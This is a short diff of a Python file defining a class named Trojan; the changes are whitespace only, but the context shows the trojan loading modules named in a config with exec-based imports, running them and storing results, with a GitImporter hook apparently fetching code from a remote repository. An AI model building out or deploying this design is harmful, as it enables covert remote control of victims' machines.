@@ -34,9 +34,9 @@ class Trojan:
         for task in config:
             if task['module'] not in sys.modules:
                 exec('import %s' % task['module'])
-
+                
         return config
-    
+
     def module_runner(self, module):
         result = sys.modules[module].run()
         self.store_module_result(result)
@@ -83,6 +83,7 @@ if __name__ == "__main__":
     sys.meta_path.append(GitImporter())
     trojan = Trojan('abc')
     trojan.run()
+
 
 
 
